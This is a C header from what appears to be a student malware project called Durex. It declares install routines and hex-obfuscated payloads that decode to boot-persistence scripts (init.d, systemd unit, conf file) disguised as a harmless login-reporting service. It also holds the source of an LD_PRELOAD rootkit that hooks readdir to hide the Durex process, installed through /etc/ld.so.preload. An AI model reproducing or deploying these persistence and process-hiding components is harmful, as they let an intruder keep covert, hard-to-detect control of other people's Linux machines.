/* ************************************************************************** */
/*                                                                            */
/*                                                        :::      ::::::::   */
/*   main.h                                             :+:      :+:    :+:   */
/*                                                    +:+ +:+         +:+     */
/*   By: root </var/mail/root>                      +#+  +:+       +#+        */
/*                                                +#+#+#+#+#+   +#+           */
/*   Created: 2018/07/15 02:49:13 by root              #+#    #+#             */
/*   Updated: 2018/08/06 19:57:48 by root             ###   ########.fr       */
/*                                                                            */
/* ************************************************************************** */

#ifndef MAIN_H
# define MAIN_H

/* flock */
# include <sys/file.h>
/* close fork setsid dup2 chdir sleep write */
# include <unistd.h>
/* open umask */
# include <sys/types.h>
# include <sys/stat.h>
# include <fcntl.h>

# include "durex.h"

# define DUREX_BINARY_FILE	"/bin/Durex"
# define DUREX_LOCK_FILE	"/var/lock/Durex.lock"

# define DUREX_INIT_FILE	"/etc/init.d/Durex"
# define DUREX_INIT_SCRIPT	"\x23\x21\x2f\x62\x69\x6e\x2f\x73\x68\x0a\x23\x23\x23\x20\x42\x45\x47\x49\x4e\x20\x49\x4e\x49\x54\x20\x49\x4e\x46\x4f\x0a\x23\x20\x50\x72\x6f\x76\x69\x64\x65\x73\x3a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x44\x75\x72\x65\x78\x0a\x23\x20\x52\x65\x71\x75\x69\x72\x65\x64\x2d\x53\x74\x61\x72\x74\x3a\x0a\x23\x20\x52\x65\x71\x75\x69\x72\x65\x64\x2d\x53\x74\x6f\x70\x3a\x0a\x23\x20\x44\x65\x66\x61\x75\x6c\x74\x2d\x53\x74\x61\x72\x74\x3a\x20\x20\x20\x20\x20\x20\x20\x20\x32\x20\x33\x20\x34\x20\x35\x0a\x23\x20\x44\x65\x66\x61\x75\x6c\x74\x2d\x53\x74\x6f\x70\x3a\x0a\x23\x20\x53\x68\x6f\x72\x74\x2d\x44\x65\x73\x63\x72\x69\x70\x74\x69\x6f\x6e\x3a\x20\x20\x20\x20\x70\x72\x69\x6e\x74\x20\x75\x73\x65\x72\x20\x6e\x61\x6d\x65\x0a\x23\x20\x44\x65\x73\x63\x72\x69\x70\x74\x69\x6f\x6e\x3a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x70\x72\x69\x6e\x74\x20\x75\x73\x65\x72\x20\x6e\x61\x6d\x65\x0a\x23\x23\x23\x20\x45\x4e\x44\x20\x49\x4e\x49\x54\x20\x49\x4e\x46\x4f\x0a\x0a\x2e\x20\x2f\x6c\x69\x62\x2f\x6c\x73\x62\x2f\x69\x6e\x69\x74\x2d\x66\x75\x6e\x63\x74\x69\x6f\x6e\x73\x0a\x0a\x50\x41\x54\x48\x3d\x27\x2f\x73\x62\x69\x6e\x3a\x2f\x62\x69\x6e\x27\x0a\x52\x45\x54\x56\x41\x4c\x3d\x30\x0a\x4e\x41\x4d\x45\x3d\x44\x75\x72\x65\x78\x0a\x44\x41\x45\x4d\x4f\x4e\x3d\x2f\x62\x69\x6e\x2f\x24\x4e\x41\x4d\x45\x0a\x53\x43\x52\x49\x50\x54\x4e\x41\x4d\x45\x3d\x2f\x65\x74\x63\x2f\x69\x6e\x69\x74\x2e\x64\x2f\x24\x4e\x41\x4d\x45\x0a\x0a\x73\x74\x61\x72\x74\x28\x29\x20\x7b\x0a\x09\x5b\x20\x2d\x66\x20\x2f\x76\x61\x72\x2f\x6c\x6f\x63\x6b\x2f\x44\x75\x72\x65\x78\x2e\x6c\x6f\x63\x6b\x20\x5d\x20\x26\x26\x20\x65\x78\x69\x74\x20\x30\x0a\x09\x74\x6f\x75\x63\x68\x20\x2f\x76\x61\x72\x2f\x6c\x6f\x63\x6b\x2f\x44\x75\x72\x65\x78\x2e\x6c\x6f\x63\x6b\x0a\x09\x73\x74\x61\x72\x74\x5f\x64\x61\x65\x6d\x6f\x6e\x20\x2f\x62\x69\x6e\x2f\x44\x75\x72\x65\x78\x0a\x09\x52\x45\x54\x56\x41\x4c\x3d\x24\x3f\x0a\x09\x72\x65\x74\x75\x72\x6e\x20\x24\x52\x45\x54\x56\x41\x4c\x0a\x7d\x0a\x0a\x73\x74\x6f\x70\x28\x29\x20\x7b\x0a\x09\x5b\x20\x2d\x66\x20\x2f\x76\x61\x72\x2f\x6c\x6f\x63\x6b\x2f\x44\x75\x72\x65\x78\x2e\x6c\x6f\x63\x6b\x20\x5d\x20\x7c\x7c\x20\x65\x78\x69\x74\x20\x30\x0a\x09\x23\x20\x70\x6b\x69\x6c\x6c\x20\x73\x65\x6e\x64\x20\x53\x49\x47\x54\x45\x52\x4d\x20\x73\x69\x67\x6e\x61\x6c\x20\x62\x79\x20\x64\x65\x66\x61\x75\x6c\x74\x0a\x09\x6b\x69\x6c\x6c\x70\x72\x6f\x63\x20\x44\x75\x72\x65\x78\x0a\x09\x52\x45\x54\x56\x41\x4c\x3d\x24\x3f\x0a\x09\x2f\x62\x69\x6e\x2f\x72\x6d\x20\x2f\x76\x61\x72\x2f\x6c\x6f\x63\x6b\x2f\x44\x75\x72\x65\x78\x2e\x6c\x6f\x63\x6b\x0a\x09\x72\x65\x74\x75\x72\x6e\x20\x24\x52\x45\x54\x56\x41\x4c\x0a\x7d\x0a\x0a\x72\x68\x73\x74\x61\x74\x75\x73\x28\x29\x20\x7b\x0a\x09\x73\x74\x61\x74\x75\x73\x5f\x6f\x66\x5f\x70\x72\x6f\x63\x20\x44\x75\x72\x65\x78\x0a\x09\x52\x45\x54\x56\x41\x4c\x3d\x24\x3f\x0a\x09\x72\x65\x74\x75\x72\x6e\x20\x24\x52\x45\x54\x56\x41\x4c\x0a\x7d\x0a\x0a\x72\x65\x73\x74\x61\x72\x74\x28\x29\x20\x7b\x0a\x09\x73\x74\x6f\x70\x0a\x09\x73\x74\x61\x72\x74\x0a\x7d\x0a\x0a\x63\x61\x73\x65\x20\x22\x24\x31\x22\x20\x69\x6e\x0a\x20\x20\x73\x74\x61\x72\x74\x29\x0a\x20\x20\x20\x20\x73\x74\x61\x72\x74\x0a\x20\x20\x3b\x3b\x0a\x20\x20\x73\x74\x6f\x70\x29\x0a\x20\x20\x20\x20\x73\x74\x6f\x70\x0a\x20\x20\x3b\x3b\x0a\x20\x20\x72\x65\x73\x74\x61\x72\x74\x7c\x66\x6f\x72\x63\x65\x2d\x72\x65\x6c\x6f\x61\x64\x29\x0a\x20\x20\x20\x20\x72\x65\x73\x74\x61\x72\x74\x0a\x20\x20\x3b\x3b\x0a\x20\x20\x73\x74\x61\x74\x75\x73\x29\x0a\x20\x20\x20\x20\x72\x68\x73\x74\x61\x74\x75\x73\x0a\x20\x20\x3b\x3b\x0a\x20\x20\x72\x65\x6c\x6f\x61\x64\x7c\x74\x72\x79\x2d\x72\x65\x73\x74\x61\x72\x74\x29\x0a\x20\x20\x20\x20\x6c\x6f\x67\x5f\x77\x61\x72\x6e\x69\x6e\x67\x5f\x6d\x73\x67\x20\x22\x41\x63\x74\x69\x6f\x6e\x20\x27\x24\x31\x27\x20\x69\x73\x20\x6d\x65\x61\x6e\x69\x6e\x67\x6c\x65\x73\x73\x20\x66\x6f\x72\x20\x74\x68\x69\x73\x20\x69\x6e\x69\x74\x20\x73\x63\x72\x69\x70\x74\x22\x0a\x20\x20\x20\x20\x65\x78\x69\x74\x20\x30\x0a\x20\x20\x3b\x3b\x0a\x2a\x29\x0a\x20\x20\x6c\x6f\x67\x5f\x73\x75\x63\x63\x65\x73\x73\x5f\x6d\x73\x67\x20\x22\x55\x73\x61\x67\x65\x3a\x20\x24\x30\x20\x7b\x73\x74\x61\x72\x74\x7c\x73\x74\x6f\x70\x7c\x72\x65\x73\x74\x61\x72\x74\x7c\x66\x6f\x72\x63\x65\x2d\x72\x65\x6c\x6f\x61\x64\x7c\x73\x74\x61\x74\x75\x73\x7d\x22\x0a\x20\x20\x65\x78\x69\x74\x20\x31\x0a\x65\x73\x61\x63\x0a"

# define DUREX_ACTIVATE			"\x73\x79\x73\x74\x65\x6d\x63\x74\x6c\x20\x65\x6e\x61\x62\x6c\x65\x20\x44\x75\x72\x65\x78\x20\x3e\x20\x2f\x64\x65\x76\x2f\x6e\x75\x6c\x6c\x20\x32\x3e\x26\x31\x20\x26\x26\x20\x73\x65\x72\x76\x69\x63\x65\x20\x44\x75\x72\x65\x78\x20\x73\x74\x61\x72\x74" /* systemctl enable Durex > /dev/null 2>&1 && service Durex start */

# define DUREX_CONF_FILE		"/etc/systemd/Durex.conf"
# define DUREX_CONF_SCRIPT		"\x23\x20\x44\x75\x72\x65\x78\x20\x2d\x20\x34\x32\x20\x70\x72\x6f\x6a\x65\x63\x74\x0a\x23\x0a\x23\x20\x44\x75\x72\x65\x78\x20\x77\x72\x69\x74\x65\x20\x74\x68\x65\x20\x75\x73\x65\x72\x20\x6c\x6f\x67\x69\x6e\x2e\x0a\x0a\x64\x65\x73\x63\x72\x69\x70\x74\x69\x6f\x6e\x09\x20\x20\x22\x44\x75\x72\x65\x78\x20\x2d\x20\x34\x32\x20\x70\x72\x6f\x6a\x65\x63\x74\x20\x2d\x20\x62\x79\x20\x67\x62\x6f\x75\x72\x67\x65\x6f\x22\x0a\x0a\x73\x74\x61\x72\x74\x20\x6f\x6e\x20\x72\x75\x6e\x6c\x65\x76\x65\x6c\x20\x5b\x32\x33\x34\x35\x5d\x0a\x73\x74\x6f\x70\x20\x6f\x6e\x20\x72\x75\x6e\x6c\x65\x76\x65\x6c\x20\x5b\x21\x32\x33\x34\x35\x5d\x0a\x0a\x6e\x6f\x72\x6d\x61\x6c\x20\x65\x78\x69\x74\x20\x30\x0a\x0a\x65\x78\x65\x63\x20\x44\x75\x72\x65\x78\x0a"

# define DUREX_SERVICE_FILE		"/lib/systemd/system/Durex.service"
# define DUREX_SERVICE_SCRIPT	"\x5b\x55\x6e\x69\x74\x5d\x0a\x44\x65\x73\x63\x72\x69\x70\x74\x69\x6f\x6e\x3d\x44\x61\x65\x6d\x6f\x6e\x20\x74\x6f\x20\x6b\x6e\x6f\x77\x20\x75\x73\x65\x72\x20\x6c\x6f\x67\x69\x6e\x0a\x41\x66\x74\x65\x72\x3d\x6e\x65\x74\x77\x6f\x72\x6b\x2d\x6f\x6e\x6c\x69\x6e\x65\x2e\x74\x61\x72\x67\x65\x74\x0a\x0a\x5b\x53\x65\x72\x76\x69\x63\x65\x5d\x0a\x54\x79\x70\x65\x3d\x73\x69\x6d\x70\x6c\x65\x0a\x45\x78\x65\x63\x53\x74\x61\x72\x74\x3d\x2f\x62\x69\x6e\x2f\x44\x75\x72\x65\x78\x0a\x0a\x5b\x49\x6e\x73\x74\x61\x6c\x6c\x5d\x0a\x57\x61\x6e\x74\x65\x64\x42\x79\x3d\x6d\x75\x6c\x74\x69\x2d\x75\x73\x65\x72\x2e\x74\x61\x72\x67\x65\x74\x0a"

# define DUREX_PROCESSHIDER_FIL	"processhider.c"
# define DUREX_PROCESSHIDER_SCR	"\x23\x64\x65\x66\x69\x6e\x65\x20\x5f\x47\x4e\x55\x5f\x53\x4f\x55\x52\x43\x45\x0a\x0a\x23\x69\x6e\x63\x6c\x75\x64\x65\x20\x3c\x73\x74\x64\x69\x6f\x2e\x68\x3e\x0a\x23\x69\x6e\x63\x6c\x75\x64\x65\x20\x3c\x64\x6c\x66\x63\x6e\x2e\x68\x3e\x0a\x23\x69\x6e\x63\x6c\x75\x64\x65\x20\x3c\x64\x69\x72\x65\x6e\x74\x2e\x68\x3e\x0a\x23\x69\x6e\x63\x6c\x75\x64\x65\x20\x3c\x73\x74\x72\x69\x6e\x67\x2e\x68\x3e\x0a\x23\x69\x6e\x63\x6c\x75\x64\x65\x20\x3c\x75\x6e\x69\x73\x74\x64\x2e\x68\x3e\x0a\x0a\x73\x74\x61\x74\x69\x63\x20\x63\x6f\x6e\x73\x74\x20\x63\x68\x61\x72\x09\x2a\x70\x72\x6f\x63\x65\x73\x73\x5f\x74\x6f\x5f\x66\x69\x6c\x74\x65\x72\x20\x3d\x20\x22\x44\x75\x72\x65\x78\x22\x3b\x0a\x0a\x73\x74\x61\x74\x69\x63\x20\x69\x6e\x74\x09\x09\x09\x67\x65\x74\x5f\x64\x69\x72\x5f\x6e\x61\x6d\x65\x28\x44\x49\x52\x20\x2a\x64\x69\x72\x70\x2c\x20\x63\x68\x61\x72\x20\x2a\x62\x75\x66\x2c\x20\x73\x69\x7a\x65\x5f\x74\x20\x73\x69\x7a\x65\x29\x0a\x7b\x0a\x09\x69\x6e\x74\x09\x09\x09\x09\x66\x64\x3b\x0a\x09\x63\x68\x61\x72\x09\x09\x09\x74\x6d\x70\x5b\x36\x34\x5d\x3b\x0a\x09\x73\x73\x69\x7a\x65\x5f\x74\x09\x09\x09\x72\x65\x74\x3b\x0a\x0a\x09\x66\x64\x20\x3d\x20\x64\x69\x72\x66\x64\x28\x64\x69\x72\x70\x29\x3b\x0a\x09\x69\x66\x20\x28\x66\x64\x20\x3c\x20\x30\x29\x0a\x09\x09\x72\x65\x74\x75\x72\x6e\x20\x30\x3b\x0a\x09\x73\x6e\x70\x72\x69\x6e\x74\x66\x28\x74\x6d\x70\x2c\x20\x73\x69\x7a\x65\x6f\x66\x28\x74\x6d\x70\x29\x2c\x20\x22\x2f\x70\x72\x6f\x63\x2f\x73\x65\x6c\x66\x2f\x66\x64\x2f\x25\x64\x22\x2c\x20\x66\x64\x29\x3b\x0a\x09\x72\x65\x74\x20\x3d\x20\x72\x65\x61\x64\x6c\x69\x6e\x6b\x28\x74\x6d\x70\x2c\x20\x62\x75\x66\x2c\x20\x73\x69\x7a\x65\x29\x3b\x0a\x09\x69\x66\x20\x28\x72\x65\x74\x20\x3c\x20\x30\x29\x0a\x09\x09\x72\x65\x74\x75\x72\x6e\x20\x30\x3b\x0a\x09\x62\x75\x66\x5b\x72\x65\x74\x5d\x20\x3d\x20\x30\x3b\x0a\x09\x72\x65\x74\x75\x72\x6e\x20\x31\x3b\x0a\x7d\x0a\x0a\x73\x74\x61\x74\x69\x63\x20\x69\x6e\x74\x09\x09\x09\x67\x65\x74\x5f\x70\x72\x6f\x63\x65\x73\x73\x5f\x6e\x61\x6d\x65\x28\x63\x68\x61\x72\x20\x2a\x70\x69\x64\x2c\x20\x63\x68\x61\x72\x20\x2a\x62\x75\x66\x29\x0a\x7b\x0a\x09\x63\x68\x61\x72\x09\x09\x09\x74\x6d\x70\x5b\x32\x35\x36\x5d\x3b\x0a\x09\x46\x49\x4c\x45\x09\x09\x09\x2a\x66\x3b\x0a\x09\x69\x6e\x74\x09\x09\x09\x09\x75\x6e\x75\x73\x65\x64\x3b\x0a\x0a\x09\x69\x66\x20\x28\x73\x74\x72\x73\x70\x6e\x28\x70\x69\x64\x2c\x20\x22\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x22\x29\x20\x21\x3d\x20\x73\x74\x72\x6c\x65\x6e\x28\x70\x69\x64\x29\x29\x0a\x09\x09\x72\x65\x74\x75\x72\x6e\x20\x30\x3b\x0a\x09\x73\x6e\x70\x72\x69\x6e\x74\x66\x28\x74\x6d\x70\x2c\x20\x73\x69\x7a\x65\x6f\x66\x28\x74\x6d\x70\x29\x2c\x20\x22\x2f\x70\x72\x6f\x63\x2f\x25\x73\x2f\x73\x74\x61\x74\x22\x2c\x20\x70\x69\x64\x29\x3b\x0a\x09\x66\x20\x3d\x20\x66\x6f\x70\x65\x6e\x28\x74\x6d\x70\x2c\x20\x22\x72\x22\x29\x3b\x0a\x09\x69\x66\x20\x28\x66\x20\x3d\x3d\x20\x4e\x55\x4c\x4c\x29\x0a\x09\x09\x72\x65\x74\x75\x72\x6e\x20\x30\x3b\x0a\x09\x69\x66\x20\x28\x66\x67\x65\x74\x73\x28\x74\x6d\x70\x2c\x20\x73\x69\x7a\x65\x6f\x66\x28\x74\x6d\x70\x29\x2c\x20\x66\x29\x20\x3d\x3d\x20\x4e\x55\x4c\x4c\x29\x20\x7b\x0a\x09\x09\x66\x63\x6c\x6f\x73\x65\x28\x66\x29\x3b\x0a\x09\x09\x72\x65\x74\x75\x72\x6e\x20\x30\x3b\x0a\x09\x7d\x0a\x09\x66\x63\x6c\x6f\x73\x65\x28\x66\x29\x3b\x0a\x09\x73\x73\x63\x61\x6e\x66\x28\x74\x6d\x70\x2c\x20\x22\x25\x64\x20\x28\x25\x5b\x5e\x29\x5d\x73\x22\x2c\x20\x26\x75\x6e\x75\x73\x65\x64\x2c\x20\x62\x75\x66\x29\x3b\x0a\x09\x72\x65\x74\x75\x72\x6e\x20\x31\x3b\x0a\x7d\x0a\x0a\x23\x64\x65\x66\x69\x6e\x65\x20\x44\x45\x43\x4c\x41\x52\x45\x5f\x52\x45\x41\x44\x44\x49\x52\x28\x64\x69\x72\x65\x6e\x74\x2c\x20\x72\x65\x61\x64\x64\x69\x72\x29\x09\x09\x09\x09\x09\x09\x09\x5c\x0a\x73\x74\x61\x74\x69\x63\x20\x73\x74\x72\x75\x63\x74\x20\x64\x69\x72\x65\x6e\x74\x09\x2a\x28\x2a\x6f\x72\x69\x67\x69\x6e\x61\x6c\x5f\x23\x23\x72\x65\x61\x64\x64\x69\x72\x29\x28\x44\x49\x52\x20\x2a\x29\x20\x3d\x20\x4e\x55\x4c\x4c\x3b\x09\x09\x5c\x0a\x73\x74\x72\x75\x63\x74\x20\x64\x69\x72\x65\x6e\x74\x09\x09\x2a\x72\x65\x61\x64\x64\x69\x72\x28\x44\x49\x52\x20\x2a\x64\x69\x72\x70\x29\x09\x09\x09\x09\x09\x09\x09\x09\x5c\x0a\x7b\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09\x5c\x0a\x09\x69\x66\x20\x28\x6f\x72\x69\x67\x69\x6e\x61\x6c\x5f\x23\x23\x72\x65\x61\x64\x64\x69\x72\x20\x3d\x3d\x20\x4e\x55\x4c\x4c\x29\x20\x7b\x09\x09\x09\x09\x09\x09\x09\x09\x5c\x0a\x09\x09\x6f\x72\x69\x67\x69\x6e\x61\x6c\x5f\x23\x23\x72\x65\x61\x64\x64\x69\x72\x20\x3d\x20\x64\x6c\x73\x79\x6d\x28\x52\x54\x4c\x44\x5f\x4e\x45\x58\x54\x2c\x20\x22\x72\x65\x61\x64\x64\x69\x72\x22\x29\x3b\x09\x09\x09\x5c\x0a\x09\x09\x69\x66\x20\x28\x6f\x72\x69\x67\x69\x6e\x61\x6c\x5f\x23\x23\x72\x65\x61\x64\x64\x69\x72\x20\x3d\x3d\x20\x4e\x55\x4c\x4c\x29\x20\x7b\x09\x09\x09\x09\x09\x09\x09\x5c\x0a\x09\x09\x09\x66\x70\x72\x69\x6e\x74\x66\x28\x73\x74\x64\x65\x72\x72\x2c\x20\x22\x45\x72\x72\x6f\x72\x20\x69\x6e\x20\x64\x6c\x73\x79\x6d\x3a\x20\x25\x73\x5c\x6e\x22\x2c\x20\x64\x6c\x65\x72\x72\x6f\x72\x28\x29\x29\x3b\x09\x09\x5c\x0a\x09\x09\x7d\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09\x5c\x0a\x09\x7d\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09\x5c\x0a\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09\x5c\x0a\x09\x73\x74\x72\x75\x63\x74\x20\x64\x69\x72\x65\x6e\x74\x09\x2a\x64\x69\x72\x3b\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09\x5c\x0a\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09\x5c\x0a\x09\x77\x68\x69\x6c\x65\x20\x28\x31\x29\x20\x7b\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09\x5c\x0a\x09\x09\x64\x69\x72\x20\x3d\x20\x6f\x72\x69\x67\x69\x6e\x61\x6c\x5f\x23\x23\x72\x65\x61\x64\x64\x69\x72\x28\x64\x69\x72\x70\x29\x3b\x09\x09\x09\x09\x09\x09\x09\x09\x5c\x0a\x09\x09\x69\x66\x20\x28\x64\x69\x72\x29\x20\x7b\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09\x5c\x0a\x09\x09\x09\x63\x68\x61\x72\x09\x64\x69\x72\x5f\x6e\x61\x6d\x65\x5b\x32\x35\x36\x5d\x3b\x09\x09\x09\x09\x09\x09\x09\x09\x09\x5c\x0a\x09\x09\x09\x63\x68\x61\x72\x09\x70\x72\x6f\x63\x65\x73\x73\x5f\x6e\x61\x6d\x65\x5b\x32\x35\x36\x5d\x3b\x09\x09\x09\x09\x09\x09\x09\x09\x5c\x0a\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09\x5c\x0a\x09\x09\x09\x69\x66\x20\x28\x67\x65\x74\x5f\x64\x69\x72\x5f\x6e\x61\x6d\x65\x28\x64\x69\x72\x70\x2c\x20\x64\x69\x72\x5f\x6e\x61\x6d\x65\x2c\x20\x73\x69\x7a\x65\x6f\x66\x28\x64\x69\x72\x5f\x6e\x61\x6d\x65\x29\x29\x20\x26\x26\x09\x5c\x0a\x09\x09\x09\x09\x73\x74\x72\x63\x6d\x70\x28\x64\x69\x72\x5f\x6e\x61\x6d\x65\x2c\x20\x22\x2f\x70\x72\x6f\x63\x22\x29\x20\x3d\x3d\x20\x30\x20\x26\x26\x09\x09\x09\x09\x09\x5c\x0a\x09\x09\x09\x09\x67\x65\x74\x5f\x70\x72\x6f\x63\x65\x73\x73\x5f\x6e\x61\x6d\x65\x28\x64\x69\x72\x2d\x3e\x64\x5f\x6e\x61\x6d\x65\x2c\x20\x70\x72\x6f\x63\x65\x73\x73\x5f\x6e\x61\x6d\x65\x29\x20\x26\x26\x09\x09\x5c\x0a\x09\x09\x09\x09\x73\x74\x72\x63\x6d\x70\x28\x70\x72\x6f\x63\x65\x73\x73\x5f\x6e\x61\x6d\x65\x2c\x20\x70\x72\x6f\x63\x65\x73\x73\x5f\x74\x6f\x5f\x66\x69\x6c\x74\x65\x72\x29\x20\x3d\x3d\x20\x30\x29\x09\x09\x5c\x0a\x09\x09\x09\x09\x63\x6f\x6e\x74\x69\x6e\x75\x65\x20\x3b\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09\x5c\x0a\x09\x09\x09\x69\x66\x20\x28\x73\x74\x72\x73\x74\x72\x28\x64\x69\x72\x2d\x3e\x64\x5f\x6e\x61\x6d\x65\x2c\x20\x70\x72\x6f\x63\x65\x73\x73\x5f\x74\x6f\x5f\x66\x69\x6c\x74\x65\x72\x29\x29\x09\x09\x09\x09\x5c\x0a\x09\x09\x09\x09\x63\x6f\x6e\x74\x69\x6e\x75\x65\x20\x3b\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09\x5c\x0a\x09\x09\x7d\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09\x5c\x0a\x09\x09\x62\x72\x65\x61\x6b\x20\x3b\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09\x5c\x0a\x09\x7d\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09\x5c\x0a\x09\x72\x65\x74\x75\x72\x6e\x20\x64\x69\x72\x3b\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09\x5c\x0a\x7d\x0a\x0a\x44\x45\x43\x4c\x41\x52\x45\x5f\x52\x45\x41\x44\x44\x49\x52\x28\x64\x69\x72\x65\x6e\x74\x36\x34\x2c\x20\x72\x65\x61\x64\x64\x69\x72\x36\x34\x29\x3b\x0a\x44\x45\x43\x4c\x41\x52\x45\x5f\x52\x45\x41\x44\x44\x49\x52\x28\x64\x69\x72\x65\x6e\x74\x2c\x20\x72\x65\x61\x64\x64\x69\x72\x29\x3b\x0a"
# define DUREX_PROCESSHIDER_LIB	"/usr/local/lib/Durex.so"
# define DUREX_PRELOAD			"/etc/ld.so.preload"

typedef struct	s_env
{
	const char	*prog;
	int			lock;
	t_sv		server;
}				t_env;

t_env			e;

void			durex();
int				install_binary();
int				install_service(void);
int				install_conf(void);
int				install_init(void);
int				hide_binary(void);
void			durexSigterm(int sig);
void			quitClearlyDaemon();

#endif
